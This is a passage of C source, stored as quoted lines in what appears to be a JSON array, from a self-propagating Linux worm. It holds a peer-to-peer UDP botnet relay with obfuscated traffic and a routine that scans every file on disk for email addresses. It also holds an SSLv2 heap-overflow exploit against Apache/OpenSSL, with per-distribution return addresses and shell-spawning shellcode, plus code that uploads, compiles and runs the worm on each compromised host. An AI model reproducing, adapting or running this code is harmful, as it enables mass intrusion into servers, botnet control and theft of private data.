            "\t\tbcopy((char*)hp->h_addr, (char*)&inst->in.sin_addr, hp->h_length);",
            "\telse inst->in.sin_addr.s_addr=inet_addr(host);",
            "\tinst->in.sin_family = AF_INET;",
            "\tinst->in.sin_port = htons(port);",
            "\tinst->error=ASUCCESS;",
            "\treturn (ASUCCESS);",
            "int audp_send(struct ainst *inst,char *buf,unsigned long len) {",
            "\tlong datalen;",
            "\tif (inst == NULL) return (AINSTANCE);",
            "\tinst->len=0;",
            "\terrno=0;",
            "\tif ((datalen=sendto(inst->sock,buf,len,0,(struct sockaddr*)&inst->in,sizeof(inst->in))) < len) {",
            "\t\tif (errno == EAGAIN) {",
            "\t\t\tinst->error=APENDING;",
            "\t\t\treturn (APENDING);",
            "\t\telse {",
            "\t\t\tinst->error=AUNKNOWN;",
            "\t\t\treturn (AUNKNOWN);",
            "\tout++;",
            "\tinst->len=datalen;",
            "\tinst->error=ASUCCESS;",
            "\treturn (ASUCCESS);",
            "int audp_sendmsg(struct ainst *inst, char *words, ...) {",
            "\tstatic char textBuffer[2048];",
            "\tunsigned int a;",
            "\tva_list args;",
            "\tva_start(args, words);",
            "\ta=vsprintf(textBuffer, words, args);",
            "\tva_end(args);",
            "\treturn audp_send(inst,textBuffer,a);",
            "int audp_recv(struct ainst *inst,struct ainst *client,char *buf,unsigned long len) {",
            "\tlong datalen,nlen;",
            "\tif (inst == NULL) return (AINSTANCE);",
            "\tnlen=sizeof(inst->in);",
            "\tinst->len=0;",
            "\tmemcpy((void*)client,(void*)inst,sizeof(struct ainst));",
            "\tif ((datalen=recvfrom(inst->sock,buf,len,0,(struct sockaddr*)&client->in,(size_t*)&nlen)) < 0) {",
            "\t\tif (errno == EAGAIN) {",
            "\t\t\tinst->error=APENDING;",
            "\t\t\treturn (APENDING);",
            "\t\telse {",
            "\t\t\tinst->error=AUNKNOWN;",
            "\t\t\treturn (AUNKNOWN);",
            "\tinst->len=datalen;",
            "\tinst->error=ASUCCESS;",
            "\treturn (ASUCCESS);",
            "int audp_close(struct ainst *inst) {",
            "\tif (inst == NULL) return (AINSTANCE);",
            "\tinst->len=0;",
            "\tif (close(inst->sock) < 0) {",
            "\t\tinst->error=AUNKNOWN;",
            "\t\treturn (AUNKNOWN);",
            "\tinst->sock=0;",
            "\tinst->error=ASUCCESS;",
            "\treturn (ASUCCESS);",
            "unsigned long _decrypt(char *str, unsigned long len) {",
            "\tunsigned long pos=0,seed[4]={0x78912389,0x094e7bc43,0xba5de30b,0x7bc54da7};",
            "\tgsrand(((seed[0]+seed[1])*seed[2])^seed[3]);",
            "\twhile(1) {",
            "\t\tgsrand(seed[pos%4]+grand()+pos);",
            "\t\tstr[pos]-=grand();",
            "\t\tpos++;",
            "\t\tif (pos >= len) break;",
            "\treturn pos;",
            "unsigned long _encrypt(char *str, unsigned long len) {",
            "\tunsigned long pos=0,seed[4]={0x78912389,0x094e7bc43,0xba5de30b,0x7bc54da7};",
            "\tgsrand(((seed[0]+seed[1])*seed[2])^seed[3]);",
            "\twhile(1) {",
            "\t\tgsrand(seed[pos%4]+grand()+pos);",
            "\t\tstr[pos]+=grand();",
            "\t\tpos++;",
            "\t\tif (pos >= len) break;",
            "\treturn pos;",
            "int useseq(unsigned long seq) {",
            "\tunsigned long a;",
            "\tif (seq == 0) return 0;",
            "\tfor (a=0;a<LINKS;a++) if (sequence[a] == seq) return 1;",
            "\treturn 0;",
            "unsigned long newseq() {",
            "\tunsigned long seq;",
            "\twhile(1) {",
            "\t\tseq=(rand()*rand())^rand();",
            "\t\tif (useseq(seq) || seq == 0) continue;",
            "\t\tbreak;",
            "\treturn seq;",
            "void addseq(unsigned long seq) {",
            "\tunsigned long i;",
            "\tfor (i=LINKS-1;i>0;i--) sequence[i]=sequence[i-1];",
            "\tsequence[0]=seq;",
            "void addserver(unsigned long server) {",
            "\tunsigned long *newlinks, i, stop;",
            "\tchar a=0;",
            "\tfor (i=0;i<numlinks;i++) if (links[i] == server) a=1;",
            "\tif (a == 1 || server == 0) return;",
            "\tnumlinks++;",
            "\tnewlinks=(unsigned long*)malloc((numlinks+1)*sizeof(unsigned long));",
            "\tif (newlinks == NULL) return;",
            "\tstop=rand()%numlinks;",
            "\tfor (i=0;i<stop;i++) newlinks[i]=links[i];",
            "\tnewlinks[i]=server;",
            "\tfor (;i<numlinks-1;i++) newlinks[i+1]=links[i];",
            "\tFREE(links);",
            "\tlinks=newlinks;",
            "void conv(char *str,int len,unsigned long server) {",
            "\tmemset(str,0,len);",
            "\tstrcpy(str,(char*)inet_ntoa(*(struct in_addr*)&server));",
            "int isreal(unsigned long server) {",
            "\tchar srv[256];",
            "\tunsigned int i,f;",
            "\tunsigned char a=0,b=0;",
            "\tconv(srv,256,server);",
            "\tfor (i=0;i<strlen(srv) && srv[i]!='.';i++);",
            "\tsrv[i]=0;",
            "\ta=atoi(srv);",
            "\tf=i+1;",
            "\tfor (i++;i<strlen(srv) && srv[i]!='.';i++);",
            "\tsrv[i]=0;",
            "\tb=atoi(srv+f);",
            "\tif (a == 127 || a == 10 || a == 0) return 0;",
            "\tif (a == 172 && b >= 16 && b <= 31) return 0;",
            "\tif (a == 192 && b == 168) return 0;",
            "\treturn 1;",
            "u_short in_cksum(u_short *addr, int len) {",
            "\tregister int nleft = len;",
            "\tregister u_short *w = addr;",
            "\tregister int sum = 0;",
            "\tu_short answer =0;",
            "\twhile (nleft > 1) {",
            "\t\tsum += *w++;",
            "\t\tnleft -= 2;",
            "\tif (nleft == 1) {",
            "\t\t*(u_char *)(&answer) = *(u_char *)w;",
            "\t\tsum += answer;",
            "\tsum = (sum >> 16) + (sum & 0xffff);",
            "\tsum += (sum >> 16);",
            "\tanswer = ~sum;",
            "\treturn(answer);",
            "int usersa(unsigned long rs) {",
            "\tunsigned long a;",
            "\tif (rs == 0) return 0;",
            "\tfor (a=0;a<LINKS;a++) if (rsa[a] == rs) return 1;",
            "\treturn 0;",
            "unsigned long newrsa() {",
            "\tunsigned long rs;",
            "\twhile(1) {",
            "\t\trs=(rand()*rand())^rand();",
            "\t\tif (usersa(rs) || rs == 0) continue;",
            "\t\tbreak;",
            "\treturn rs;",
            "void addrsa(unsigned long rs) {",
            "\tunsigned long i;",
            "\tfor (i=LINKS-1;i>0;i--) rsa[i]=rsa[i-1];",
            "\trsa[0]=rs;",
            "void delqueue(unsigned long id) {",
            "\tstruct mqueue *getqueue=queues, *prevqueue=NULL;",
            "\twhile(getqueue != NULL) {",
            "\t\tif (getqueue->id == id) {",
            "\t\t\tgetqueue->trys--;",
            "\t\t\tif (!getqueue->trys) {",
            "\t\t\t\tif (prevqueue) prevqueue->next=getqueue->next;",
            "\t\t\t\telse queues=getqueue->next;",
            "\t\t\t}",
            "\t\t\treturn;",
            "\t\tprevqueue=getqueue;",
            "\t\tgetqueue=getqueue->next;",
            "int waitforqueues() {",
            "\tif (mfork() == 0) {",
            "\t\tsleep(gettimeout());",
            "\t\treturn 0;",
            "\treturn 1;",
            "//////////////////////////////////////////////////////////////////////////////////////",
            "//                                   Sending functions                              //",
            "//////////////////////////////////////////////////////////////////////////////////////",
            "struct ainst udpserver;",
            "char *lowsend(struct ainst *ts,unsigned char b,char *buf,unsigned long len) {",
            "\tstruct llheader rp;",
            "\tstruct mqueue *q;",
            "\tchar *mbuf=(char*)malloc(sizeof(rp)+len);",
            "\tif (mbuf == NULL) return NULL;",
            "\tmemset((void*)&rp,0,sizeof(struct llheader));",
            "\trp.checksum=in_cksum(buf,len);",
            "\trp.id=newrsa();",
            "\trp.type=0;",
            "\tmemcpy(mbuf,&rp,sizeof(rp));",
            "\tmemcpy(mbuf+sizeof(rp),buf,len);",
            "\tq=(struct mqueue *)malloc(sizeof(struct mqueue));",
            "\tq->packet=(char*)malloc(sizeof(rp)+len);",
            "\tmemcpy(q->packet,mbuf,sizeof(rp)+len);",
            "\tq->len=sizeof(rp)+len;",
            "\tq->id=rp.id;",
            "\tq->time=time(NULL);",
            "\tq->ltime=time(NULL);",
            "\tif (b) {",
            "\t\tq->destination=0;",
            "\t\tq->port=PORT;",
            "\t\tq->trys=b;",
            "\telse {",
            "\t\tq->destination=ts->in.sin_addr.s_addr;",
            "\t\tq->port=htons(ts->in.sin_port);",
            "\t\tq->trys=1;",
            "\tq->next=queues;",
            "\tqueues=q;",
            "\tif (ts) {",
            "\t\taudp_send(ts,mbuf,len+sizeof(rp));",
            "\t\tFREE(mbuf);",
            "\telse return mbuf;",
            "int relayclient(struct ainst *ts,char *buf,unsigned long len) {",
            "\treturn lowsend(ts,0,buf,len)?1:0;",
            "int relay(unsigned long server,char *buf,unsigned long len) {",
            "\tstruct ainst ts;",
            "\tchar srv[256];",
            "\tmemset((void*)&ts,0,sizeof(struct ainst));",
            "\tconv(srv,256,server);",
            "\taudp_relay(&udpserver,&ts,srv,PORT);",
            "\treturn lowsend(&ts,0,buf,len)?1:0;",
            "void segment(unsigned char low,char *buf, unsigned long len) {",
            "\tunsigned long a=0,c=0;",
            "\tchar *mbuf=NULL;",
            "\tif (numlinks == 0 || links == NULL) return;",
            "\tif (low) mbuf=lowsend(NULL,low,buf,len);",
            "\tfor(;c < 10;c++) {",
            "\t\ta=rand()%numlinks;",
            "\t\tif (links[a] != myip) {",
            "\t\t\tstruct ainst ts;",
            "\t\t\tchar srv[256];",
            "\t\t\tmemset((void*)&ts,0,sizeof(struct ainst));",
            "\t\t\tconv(srv,256,links[a]);",
            "\t\t\taudp_relay(&udpserver,&ts,srv,PORT);",
            "\t\t\tif (mbuf) audp_send(&ts,mbuf,len+sizeof(struct llheader));",
            "\t\t\telse audp_send(&ts,buf,len);",
            "\t\t\tbreak;",
            "\tFREE(mbuf);",
            "void broadcast(char *buf,unsigned long len) {",
            "\tstruct route_rec rc;",
            "\tchar *str=(char*)malloc(sizeof(struct route_rec)+len+1);",
            "\tif (str == NULL) return;",
            "\tmemset((void*)&rc,0,sizeof(struct route_rec));",
            "\trc.h.tag=0x26;",
            "\trc.h.id=rand();",
            "\trc.h.len=sizeof(struct route_rec)+len;",
            "\trc.h.seq=newseq();",
            "\trc.server=0;",
            "\trc.sync=syncmodes;",
            "\trc.links=numlinks;",
            "\trc.hops=5;",
            "\tmemcpy((void*)str,(void*)&rc,sizeof(struct route_rec));",
            "\tmemcpy((void*)(str+sizeof(struct route_rec)),(void*)buf,len);",
            "\tsegment(2,str,sizeof(struct route_rec)+len);",
            "\tFREE(str);",
            "void syncm(struct ainst *inst,char tag,int id) {",
            "\tstruct addsrv_rec rc;",
            "\tstruct next_rec { unsigned long server; } fc;",
            "\tunsigned long a,b;",
            "\tfor (b=0;;b+=700) {",
            "\t\tunsigned long _numlinks=numlinks-b>700?700:numlinks-b;",
            "\t\tunsigned long *_links=links+b;",
            "\t\tunsigned char *str;",
            "\t\tif (b > numlinks) break;",
            "\t\tstr=(unsigned char*)malloc(sizeof(struct addsrv_rec)+(_numlinks*sizeof(struct next_rec)));",
            "\t\tif (str == NULL) return;",
            "\t\tmemset((void*)&rc,0,sizeof(struct addsrv_rec));",
            "\t\trc.h.tag=tag;",
            "\t\trc.h.id=id;",
            "\t\tif (id) rc.h.seq=newseq();",
            "\t\trc.h.len=sizeof(struct next_rec)*_numlinks;",
            "\t\tmemcpy((void*)str,(void*)&rc,sizeof(struct addsrv_rec));",
            "\t\tfor (a=0;a<_numlinks;a++) {",
            "\t\t\tmemset((void*)&fc,0,sizeof(struct next_rec));",
            "\t\t\tfc.server=_links[a];",
            "\t\t\tmemcpy((void*)(str+sizeof(struct addsrv_rec)+(a*sizeof(struct next_rec))),(void*)&fc,sizeof(struct next_rec));",
            "\t\tif (!id) relay(inst->in.sin_addr.s_addr,(void*)str,sizeof(struct addsrv_rec)+(_numlinks*sizeof(struct next_rec)));",
            "\t\telse relayclient(inst,(void*)str,sizeof(struct addsrv_rec)+(_numlinks*sizeof(struct next_rec)));",
            "\t\tFREE(str);",
            "void senderror(struct ainst *inst, int id, char *buf2) {",
            "\tstruct data_rec rc;",
            "\tchar *str,*buf=strdup(buf2);",
            "\tmemset((void*)&rc,0,sizeof(struct data_rec));",
            "\trc.h.tag=0x45;",
            "\trc.h.id=id;",
            "\trc.h.seq=newseq();",
            "\trc.h.len=strlen(buf2);",
            "\t_encrypt(buf,strlen(buf2));",
            "\tstr=(char*)malloc(sizeof(struct data_rec)+strlen(buf2)+1);",
            "\tif (str == NULL) {",
            "\t\tFREE(buf);",
            "\t\treturn;",
            "\tmemcpy((void*)str,(void*)&rc,sizeof(struct data_rec));",
            "\tmemcpy((void*)(str+sizeof(struct data_rec)),buf,strlen(buf2));",
            "\trelayclient(&udpclient,str,sizeof(struct data_rec)+strlen(buf2));",
            "\tFREE(str);",
            "\tFREE(buf);",
            "//////////////////////////////////////////////////////////////////////////////////////",
            "//                                      Scan for email                              //",
            "//////////////////////////////////////////////////////////////////////////////////////",
            "int isgood(char a) {",
            "\tif (a >= 'a' && a <= 'z') return 1;",
            "\tif (a >= 'A' && a <= 'Z') return 1;",
            "\tif (a >= '0' && a <= '9') return 1;",
            "\tif (a == '.' || a == '@' || a == '^' || a == '-' || a == '_') return 1;",
            "\treturn 0;",
            "int islisten(char a) {",
            "\tif (a == '.') return 1;",
            "\tif (a >= 'a' && a <= 'z') return 1;",
            "\tif (a >= 'A' && a <= 'Z') return 1;",
            "\treturn 0;",
            "struct _linklist {",
            "\tchar *name;",
            "\tstruct _linklist *next;",
            "} *linklist=NULL;",
            "void AddToList(char *str) {",
            "\tstruct _linklist *getb=linklist,*newb;",
            "\twhile(getb != NULL) {",
            "\t\tif (!strcmp(str,getb->name)) return;",
            "\t\tgetb=getb->next;",
            "\tnewb=(struct _linklist *)malloc(sizeof(struct _linklist));",
            "\tif (newb == NULL) return;",
            "\tnewb->name=strdup(str);",
            "\tnewb->next=linklist;",
            "\tlinklist=newb;",
            "void cleanup(char *buf) {",
            "\twhile(buf[strlen(buf)-1] == '\\n' || buf[strlen(buf)-1] == '\\r' || buf[strlen(buf)-1] == ' ') buf[strlen(buf)-1] = 0;",
            "\twhile(*buf == '\\n' || *buf == '\\r' || *buf == ' ') {",
            "\t\tunsigned long i;",
            "\t\tfor (i=strlen(buf)+1;i>0;i--) buf[i-1]=buf[i];",
            "void ScanFile(char *f) {",
            "\tFILE *file=fopen(f,\"r\");",
            "\tunsigned long startpos=0;",
            "\tif (file == NULL) return;",
            "\twhile(1) {",
            "\t\tchar buf[2];",
            "\t\tmemset(buf,0,2);",
            "\t\tfseek(file,startpos,SEEK_SET);",
            "\t\tfread(buf,1,1,file);",
            "\t\tstartpos++;",
            "\t\tif (feof(file)) break;",
            "\t\tif (*buf == '@') {",
            "\t\t\tchar email[256],c,d;",
            "\t\t\tunsigned long pos=0;",
            "\t\t\twhile(1) {",
            "\t\t\t\tunsigned long oldpos=ftell(file);",
            "\t\t\t\tfseek(file,-1,SEEK_CUR);",
            "\t\t\t\tc=fgetc(file);",
            "\t\t\t\tif (!isgood(c)) break;",
            "\t\t\t\tfseek(file,-1,SEEK_CUR);",
            "\t\t\t\tif (oldpos == ftell(file)) break;",
            "\t\t\t}",
            "\t\t\tfor (pos=0,c=0,d=0;pos<255;pos++) {",
            "\t\t\t\temail[pos]=fgetc(file);",
            "\t\t\t\tif (email[pos] == '.') c++;",
            "\t\t\t\tif (email[pos] == '@') d++;",
            "\t\t\t\tif (!isgood(email[pos])) break;",
            "\t\t\t}",
            "\t\t\temail[pos]=0;",
            "\t\t\tif (c == 0 || d != 1) continue;",
            "\t\t\tif (email[strlen(email)-1] == '.') email[strlen(email)-1]=0;",
            "\t\t\tif (*email == '@' || *email == '.' || !*email) continue;",
            "\t\t\tif (!strcmp(email,\"webmaster@mydomain.com\")) continue;",
            "\t\t\tfor (pos=0,c=0;pos<strlen(email);pos++) if (email[pos] == '.') c=pos;",
            "\t\t\tif (c == 0) continue;",
            "\t\t\tif (!strncmp(email+c,\".hlp\",4)) continue;",
            "\t\t\tfor (pos=c,d=0;pos<strlen(email);pos++) if (!islisten(email[pos])) d=1;",
            "\t\t\tif (d == 1) continue;",
            "\t\t\tAddToList(email);",
            "\tfclose(file);",
            "void StartScan() {",
            "\tFILE *f;",
            "\tf=popen(\"find / -type f\",\"r\");",
            "\tif (f == NULL) return;",
            "\twhile(1) {",
            "\t\tchar fullfile[MAXPATH];",
            "\t\tmemset(fullfile,0,MAXPATH);",
            "\t\tfgets(fullfile,MAXPATH,f);",
            "\t\tif (feof(f)) break;",
            "\t\twhile(fullfile[strlen(fullfile)-1]=='\\n' ||",
            "\t\t\tfullfile[strlen(fullfile)-1] == '\\r')",
            "\t\t\tfullfile[strlen(fullfile)-1]=0;",
            "\t\tif (!strncmp(fullfile,\"/proc\",5)) continue;",
            "\t\tif (!strncmp(fullfile,\"/dev\",4)) continue;",
            "\t\tif (!strncmp(fullfile,\"/bin\",4)) continue;",
            "\t\tScanFile(fullfile);",
            "//////////////////////////////////////////////////////////////////////////////////////",
            "//                                    Exploit                                       //",
            "//////////////////////////////////////////////////////////////////////////////////////",
            "#ifdef SCAN",
            "#include <openssl/ssl.h>",
            "#include <openssl/rsa.h>",
            "#include <openssl/x509.h>",
            "#include <openssl/evp.h>",
            "char *GetAddress(char *ip) {",
            "\tstruct sockaddr_in sin;",
            "\tfd_set fds;",
            "\tint n,d,sock;",
            "\tchar buf[1024];",
            "\tstruct timeval tv;",
            "\tsock = socket(PF_INET, SOCK_STREAM, 0);",
            "\tsin.sin_family = PF_INET;",
            "\tsin.sin_addr.s_addr = inet_addr(ip);",
            "\tsin.sin_port = htons(80);",
            "\tif(connect(sock, (struct sockaddr *) & sin, sizeof(sin)) != 0) return NULL;",
            "\twrite(sock,\"GET / HTTP/1.1\\r\\n\\r\\n\",strlen(\"GET / HTTP/1.1\\r\\n\\r\\n\"));",
            "\ttv.tv_sec = 15;",
            "\ttv.tv_usec = 0;",
            "\tFD_ZERO(&fds);",
            "\tFD_SET(sock, &fds);",
            "\tmemset(buf, 0, sizeof(buf));",
            "\tif(select(sock + 1, &fds, NULL, NULL, &tv) > 0) {",
            "\t\tif(FD_ISSET(sock, &fds)) {",
            "\t\t\tif((n = read(sock, buf, sizeof(buf) - 1)) < 0) return NULL;",
            "\t\t\tfor (d=0;d<n;d++) if (!strncmp(buf+d,\"Server: \",strlen(\"Server: \"))) {",
            "\t\t\t\tchar *start=buf+d+strlen(\"Server: \");",
            "\t\t\t\tfor (d=0;d<strlen(start);d++) if (start[d] == '\\n') start[d]=0;",
            "\t\t\t\tcleanup(start);",
            "\t\t\t\treturn strdup(start);",
            "\t\t\t}",
            "\treturn NULL;",
            "#define\tENC(c) ((c) ? ((c) & 077) + ' ': '`')",
            "int sendch(int sock,int buf) {",
            "\tchar a[2];",
            "\tint b=1;",
            "\tif (buf == '`' || buf == '\\\\' || buf == '$') {",
            "\t\ta[0]='\\\\';",
            "\t\ta[1]=0;",
            "\t\tb=write(sock,a,1);",
            "\tif (b <= 0) return b;",
            "\ta[0]=buf;",
            "\ta[1]=0;",
            "\treturn write(sock,a,1);",
            "int writem(int sock, char *str) {",
            "\treturn write(sock,str,strlen(str));",
            "int encode(int a) {",
            "\tregister int ch, n;",
            "\tregister char *p;",
            "\tchar buf[80];",
            "\tFILE *in;",
            "\tif ((in=fopen(\"/tmp/.bugtraq.c\",\"r\")) == NULL) return 0;",
            "\twritem(a,\"begin 655 .bugtraq.c\\n\");",
            "\twhile ((n = fread(buf, 1, 45, in))) {",
            "\t\tch = ENC(n);",
            "\t\tif (sendch(a,ch) <= ASUCCESS) break;",
            "\t\tfor (p = buf; n > 0; n -= 3, p += 3) {",
            "\t\t\tif (n < 3) {",
            "\t\t\t\tp[2] = '\\0';",
            "\t\t\t\tif (n < 2) p[1] = '\\0';",
            "\t\t\t}",
            "\t\t\tch = *p >> 2;",
            "\t\t\tch = ENC(ch);",
            "\t\t\tif (sendch(a,ch) <= ASUCCESS) break;",
            "\t\t\tch = ((*p << 4) & 060) | ((p[1] >> 4) & 017);",
            "\t\t\tch = ENC(ch);",
            "\t\t\tif (sendch(a,ch) <= ASUCCESS) break;",
            "\t\t\tch = ((p[1] << 2) & 074) | ((p[2] >> 6) & 03);",
            "\t\t\tch = ENC(ch);",
            "\t\t\tif (sendch(a,ch) <= ASUCCESS) break;",
            "\t\t\tch = p[2] & 077;",
            "\t\t\tch = ENC(ch);",
            "\t\t\tif (sendch(a,ch) <= ASUCCESS) break;",
            "\t\tch='\\n';",
            "\t\tif (sendch(a,ch) <= ASUCCESS) break;",
            "\t\tusleep(10);",
            "\tif (ferror(in)) {",
            "\t\tfclose(in);",
            "\t\treturn 0;",
            "\tch = ENC('\\0');",
            "\tsendch(a,ch);",
            "\tch = '\\n';",
            "\tsendch(a,ch);",
            "\twritem(a,\"end\\n\");",
            "\tif (in) fclose(in);",
            "\treturn 1;",
            "#define MAX_ARCH 21",
            "struct archs {",
            "\tchar *os;",
            "\tchar *apache;",
            "\tint func_addr;",
            "} architectures[] = {",
            "\t{\"Gentoo\", \"\", 0x08086c34},",
            "\t{\"Debian\", \"1.3.26\", 0x080863cc},",
            "\t{\"Red-Hat\", \"1.3.6\", 0x080707ec},",
            "\t{\"Red-Hat\", \"1.3.9\", 0x0808ccc4},",
            "\t{\"Red-Hat\", \"1.3.12\", 0x0808f614},",
            "\t{\"Red-Hat\", \"1.3.12\", 0x0809251c},",
            "\t{\"Red-Hat\", \"1.3.19\", 0x0809af8c},",
            "\t{\"Red-Hat\", \"1.3.20\", 0x080994d4},",
            "\t{\"Red-Hat\", \"1.3.26\", 0x08161c14},",
            "\t{\"Red-Hat\", \"1.3.23\", 0x0808528c},",
            "\t{\"Red-Hat\", \"1.3.22\", 0x0808400c},",
            "\t{\"SuSE\", \"1.3.12\", 0x0809f54c},",
            "\t{\"SuSE\", \"1.3.17\", 0x08099984},",
            "\t{\"SuSE\", \"1.3.19\", 0x08099ec8},",
            "\t{\"SuSE\", \"1.3.20\", 0x08099da8},",
            "\t{\"SuSE\", \"1.3.23\", 0x08086168},",
            "\t{\"SuSE\", \"1.3.23\", 0x080861c8},",
            "\t{\"Mandrake\", \"1.3.14\", 0x0809d6c4},",
            "\t{\"Mandrake\", \"1.3.19\", 0x0809ea98},",
            "\t{\"Mandrake\", \"1.3.20\", 0x0809e97c},",
            "\t{\"Mandrake\", \"1.3.23\", 0x08086580},",
            "\t{\"Slackware\", \"1.3.26\", 0x083d37fc},",
            "\t{\"Slackware\", \"1.3.26\",0x080b2100}",
            "extern int errno;",
            "int cipher;",
            "int ciphers;",
            "#define FINDSCKPORTOFS\t   208 + 12 + 46",
            "unsigned char overwrite_session_id_length[] =",
            "\t\"AAAA\"",
            "\t\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"",
            "\t\"\\x70\\x00\\x00\\x00\";",
            "unsigned char overwrite_next_chunk[] =",
            "\t\"AAAA\"",
            "\t\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"",
            "\t\"AAAA\"",
            "\t\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"",
            "\t\"AAAA\"",
            "\t\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"",
            "\t\"AAAA\"",
            "\t\"\\x00\\x00\\x00\\x00\"",
            "\t\"\\x00\\x00\\x00\\x00\"",
            "\t\"AAAA\"",
            "\t\"\\x01\\x00\\x00\\x00\"",
            "\t\"AAAA\"",
            "\t\"AAAA\"",
            "\t\"AAAA\"",
            "\t\"\\x00\\x00\\x00\\x00\"",
            "\t\"AAAA\"",
            "\t\"\\x00\\x00\\x00\\x00\"",
            "\t\"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"",
            "\t\"AAAAAAAA\"",
            "\t\"\\x00\\x00\\x00\\x00\"",
            "\t\"\\x11\\x00\\x00\\x00\"",
            "\t\"fdfd\"",
            "\t\"bkbk\"",
            "\t\"\\x10\\x00\\x00\\x00\"",
            "\t\"\\x10\\x00\\x00\\x00\"",
            "\t\"\\xeb\\x0a\\x90\\x90\"",
            "\t\"\\x90\\x90\\x90\\x90\"",
            "\t\"\\x90\\x90\\x90\\x90\"",
            "\t\"\\x31\\xdb\"",
            "\t\"\\x89\\xe7\"",
            "\t\"\\x8d\\x77\\x10\"",
            "\t\"\\x89\\x77\\x04\"",
            "\t\"\\x8d\\x4f\\x20\"",
            "\t\"\\x89\\x4f\\x08\"",
            "\t\"\\xb3\\x10\"",
            "\t\"\\x89\\x19\"",
            "\t\"\\x31\\xc9\"",
            "\t\"\\xb1\\xff\"",
            "\t\"\\x89\\x0f\"",
            "\t\"\\x51\"",
            "\t\"\\x31\\xc0\"",
            "\t\"\\xb0\\x66\"",
            "\t\"\\xb3\\x07\"",
            "\t\"\\x89\\xf9\"",
            "\t\"\\xcd\\x80\"",
            "\t\"\\x59\"",
            "\t\"\\x31\\xdb\"",
            "\t\"\\x39\\xd8\"",
            "\t\"\\x75\\x0a\"",
            "\t\"\\x66\\xb8\\x12\\x34\"",
            "\t\"\\x66\\x39\\x46\\x02\"",
            "\t\"\\x74\\x02\"",
            "\t\"\\xe2\\xe0\"",
            "\t\"\\x89\\xcb\"",
            "\t\"\\x31\\xc9\"",
            "\t\"\\xb1\\x03\"",
            "\t\"\\x31\\xc0\"",
            "\t\"\\xb0\\x3f\"",
            "\t\"\\x49\"",
            "\t\"\\xcd\\x80\"",
            "\t\"\\x41\"",
            "\t\"\\xe2\\xf6\"",
            "\t\"\\x31\\xc9\"",
            "\t\"\\xf7\\xe1\"",
            "\t\"\\x51\"",
            "\t\"\\x5b\"",
            "\t\"\\xb0\\xa4\"",
            "\t\"\\xcd\\x80\"",
            "\t\"\\x31\\xc0\"",
            "\t\"\\x50\"",
            "\t\"\\x68\"\"//sh\"",
            "\t\"\\x68\"\"/bin\"",
            "\t\"\\x89\\xe3\"",
            "\t\"\\x50\"",
            "\t\"\\x53\"",
            "\t\"\\x89\\xe1\"",
            "\t\"\\x99\"",
            "\t\"\\xb0\\x0b\"",
            "\t\"\\xcd\\x80\";",
            "#define BUFSIZE 16384",
            "#define CHALLENGE_LENGTH 16",
            "#define RC4_KEY_LENGTH 16",
            "#define RC4_KEY_MATERIAL_LENGTH (RC4_KEY_LENGTH*2)",
            "#define n2s(c,s)\t((s=(((unsigned int)(c[0]))<< 8)| (((unsigned int)(c[1]))\t )),c+=2)",
            "#define s2n(s,c)\t((c[0]=(unsigned char)(((s)>> 8)&0xff), c[1]=(unsigned char)(((s)\t )&0xff)),c+=2)",
            "typedef struct {",
            "\tint sock;",
            "\tunsigned char challenge[CHALLENGE_LENGTH];",
            "\tunsigned char master_key[RC4_KEY_LENGTH];",
            "\tunsigned char key_material[RC4_KEY_MATERIAL_LENGTH];",
            "\tint conn_id_length;",
            "\tunsigned char conn_id[SSL2_MAX_CONNECTION_ID_LENGTH];",
            "\tX509 *x509;",
            "\tunsigned char* read_key;",
            "\tunsigned char* write_key;",
            "\tRC4_KEY* rc4_read_key;",
            "\tRC4_KEY* rc4_write_key;",
            "\tint read_seq;",
            "\tint write_seq;",
            "\tint encrypted;",
            "} ssl_conn;",
            "long getip(char *hostname) {",
            "\tstruct hostent *he;",
            "\tlong ipaddr;",
            "\tif ((ipaddr = inet_addr(hostname)) < 0) {",
            "\t\tif ((he = gethostbyname(hostname)) == NULL) exit(-1);",
            "\t\tmemcpy(&ipaddr, he->h_addr, he->h_length);",
            "\treturn ipaddr;",
            "int sh(int sockfd) {",
            "\tchar localip[256], rcv[1024];",
            "\tfd_set rset;",
            "\tint maxfd, n;",
            "\talarm(3600);",
            "\twritem(sockfd,\"TERM=xterm; export TERM=xterm; exec bash -i\\n\");",
            "\twritem(sockfd,\"rm -rf /tmp/.bugtraq.c;cat > /tmp/.uubugtraq << __eof__;\\n\");",
            "\tencode(sockfd);",
            "\twritem(sockfd,\"__eof__\\n\");",
            "\tconv(localip,256,myip);",
            "\tmemset(rcv,0,1024);",
            "\tsprintf(rcv,\"/usr/bin/uudecode -o /tmp/.bugtraq.c /tmp/.uubugtraq;gcc -o /tmp/.bugtraq /tmp/.bugtraq.c -lcrypto;/tmp/.bugtraq %s;exit;\\n\",localip);",
            "\twritem(sockfd,rcv);",
            "\tfor (;;) {",
            "\t\tFD_ZERO(&rset);",
            "\t\tFD_SET(sockfd, &rset);",
            "\t\tselect(sockfd+1, &rset, NULL, NULL, NULL);",
            "\t\tif (FD_ISSET(sockfd, &rset)) if ((n = read(sockfd, rcv, sizeof(rcv))) == 0) return 0;",
            "int get_local_port(int sock) {",
            "\tstruct sockaddr_in s_in;",
            "\tunsigned int namelen = sizeof(s_in);",
            "\tif (getsockname(sock, (struct sockaddr *)&s_in, &namelen) < 0) exit(1);",
            "\treturn s_in.sin_port;",
            "int connect_host(char* host, int port) {",
            "\tstruct sockaddr_in s_in;",
            "\tint sock;",
            "\ts_in.sin_family = AF_INET;",
            "\ts_in.sin_addr.s_addr = getip(host);",
            "\ts_in.sin_port = htons(port);",
            "\tif ((sock = socket(AF_INET, SOCK_STREAM, 0)) <= 0) exit(1);",
            "\talarm(10);",
            "\tif (connect(sock, (struct sockaddr *)&s_in, sizeof(s_in)) < 0) exit(1);",
            "\talarm(0);",
            "\treturn sock;",
            "ssl_conn* ssl_connect_host(char* host, int port) {",
            "\tssl_conn* ssl;",
            "\tif (!(ssl = (ssl_conn*) malloc(sizeof(ssl_conn)))) exit(1);",
            "\tssl->encrypted = 0;",
            "\tssl->write_seq = 0;",
            "\tssl->read_seq = 0;",
            "\tssl->sock = connect_host(host, port);",
            "\treturn ssl;",
            "char res_buf[30];",
            "int read_data(int sock, unsigned char* buf, int len) {",
            "\tint l;",
